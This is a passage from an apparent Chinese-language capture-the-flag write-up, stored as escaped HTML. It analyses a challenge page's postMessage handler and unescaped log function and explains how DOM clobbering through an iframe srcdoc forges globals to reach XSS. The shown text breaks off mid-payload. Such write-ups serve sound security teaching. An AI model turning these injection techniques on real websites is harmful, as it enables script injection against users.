&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[reassign]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;Value of &quot;&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot; was changed to &quot;&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;b&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;warn&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[reassign]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;Error changing value (&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;err&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token function&quot;&gt;_onmessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// keep default functions&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但這邊的 &lt;code&gt;eval&lt;/code&gt; 似乎沒辦法讓我們直接執行想要的程式碼，因為規範滿嚴格的（大寫字母、部分小寫字母、數字跟 +-），可能是有其他用途。&lt;/p&gt;
&lt;p&gt;另外一個有機會的地方是這裡：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; log &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;prefix&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;info&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; safe&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; line &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;li&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; prefix_tag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;span&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; text_tag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;span&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;type&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token comment&quot;&gt;// not important&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;br&gt;    data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;safe&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-flags&quot;&gt;g&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;&amp;amp;lt;&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;    prefix_tag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; prefix&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    text_tag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    line&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;prefix_tag&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    line&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;text_tag&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;querySelector&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;#console&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;line&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果 safe 是 true 的話，那 data 就不會被 escape，就可以插入任意的 HTML，達成 XSS。&lt;/p&gt;
&lt;p&gt;而這邊值得注意的是函式的參數那一段：&lt;code&gt;let log = (prefix, data, type=&#39;info&#39;, safe=false)&lt;/code&gt;，這點值得特別解釋一下。&lt;/p&gt;
&lt;p&gt;在有些程式語言裡面，支援這種參數的命名，在呼叫 function 的時候可以用名稱來傳入參數，例如說：&lt;code&gt;log(prefix=&#39;a&#39;, safe=true)&lt;/code&gt;，就傳入對應到的參數。&lt;/p&gt;
&lt;p&gt;但是在 JS 裡面並沒有這種東西，參數的對應完全是靠「順序」來決定的。舉例來說，&lt;code&gt;log(&amp;quot;[logv]: &amp;quot;, window[m.message], safe=false, type=&#39;info&#39;);&lt;/code&gt; 對應到的參數其實是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;prefix: &lt;code&gt;&amp;quot;[logv]: &amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;data: &lt;code&gt;window[m.message]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;type: &lt;code&gt;false&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;safe: &lt;code&gt;&#39;info&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;是靠順序而不是靠名稱，這也是許多新手會被搞混的地方。&lt;/p&gt;
&lt;p&gt;總之呢，就讓我們從 &lt;code&gt;log&lt;/code&gt; 這個函式開始往回找吧，要執行到這一段，必須要 post message 到這個 window，然後符合一些條件。&lt;/p&gt;
&lt;h2 id=&quot;%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E6%88%90%E5%8A%9F-post-message&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E6%88%90%E5%8A%9F-post-message&quot;&gt;#&lt;/a&gt; 第一關：成功 post message&lt;/h2&gt;
&lt;p&gt;這個 console.php 的頁面有一些條件限制，如果沒有符合這些條件就沒辦法執行到 log function 去。&lt;/p&gt;
&lt;p&gt;首先這個頁面必須被 embed 在 iframe 裡面：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;Console&#39;&lt;/span&gt;&lt;br&gt;document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;title &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; name&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;top &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; window&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;head&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;parentNode&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// hide code if not on iframe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再來還有這些檢查要通過：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;top&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;DEV&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;Production build!&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;checkCredentials&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;username&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; password&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; users &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; top&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;store&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;users&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; access &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;users&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;admin&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; users&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;moderator&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; users&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;manager&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;users &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;password&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x &lt;span class=&quot;token keyword&quot;&gt;of&lt;/span&gt; access&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;username &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; username &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; x&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;password &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; password&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; _onmessage &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; onmessage&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token function-variable function&quot;&gt;onmessage&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token parameter&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; m &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;credentials &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;checkCredentials&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;credentials&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;username&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;credentials&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;password&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// do nothing if unauthorized&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token comment&quot;&gt;// ...&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token comment&quot;&gt;// hide this script on production&lt;/span&gt;&lt;br&gt;    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;currentScript&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;top.DEV&lt;/code&gt; 要是 truthy，然後傳進去的 credentials 要符合 &lt;code&gt;top.store.users.admin.username&lt;/code&gt; 還有 &lt;code&gt;top.store.users.admin.password&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;這樣我應該自己寫一個頁面，然後設置一下這些全域變數就好了？&lt;/p&gt;
&lt;p&gt;沒辦法，因為有 Same Origin Policy 的存在，你只能存取同源頁面下的 window 內容，所以如果是自己寫一個頁面然後把 console.php embed 在裡面的話，在存取 &lt;code&gt;top.DEV&lt;/code&gt; 時就會出錯。&lt;/p&gt;
&lt;p&gt;所以我們需要有一個同源的頁面可以讓我們設置一些東西。而這個頁面，顯然就是可以讓我們插入一些 HTML 的 htmledit.php 了。&lt;/p&gt;
&lt;h2 id=&quot;dom-clobbering&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#dom-clobbering&quot;&gt;#&lt;/a&gt; DOM clobbering&lt;/h2&gt;
&lt;p&gt;該怎麼在不能執行 JS 的情況下設置全域變數呢？沒錯，就是 DOM clobbering。&lt;/p&gt;
&lt;p&gt;舉例來說，如果你有個 &lt;code&gt;&amp;lt;div id=&amp;quot;a&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;，在 JS 裡面你就可以用 &lt;code&gt;window.a&lt;/code&gt; 或是 &lt;code&gt;a&lt;/code&gt; 去存取到這個 div 的 DOM。&lt;/p&gt;
&lt;p&gt;如果你對 DOM clobbering 不熟的話可以參考我之前寫過的&lt;a href=&quot;https://blog.huli.tw/2021/01/23/dom-clobbering/&quot;&gt;淺談 DOM Clobbering 的原理及應用&lt;/a&gt;，或是這一篇也寫得很好：&lt;a href=&quot;https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/&quot;&gt;使用 Dom Clobbering 扩展 XSS&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果要達成多層的變數設置，就要利用到 &lt;code&gt;iframe&lt;/code&gt; 搭配 &lt;code&gt;srcdoc&lt;/code&gt;：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;a&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;DEV&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;iframe&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;store&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;srcdoc&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&#39;&lt;/span&gt;&lt;br&gt;    &amp;lt;a id=&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;users&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&gt;&amp;lt;/a&gt;&lt;br&gt;    &amp;lt;a id=&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;users&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt; name=&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;admin&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt; href=&lt;span class=&quot;token 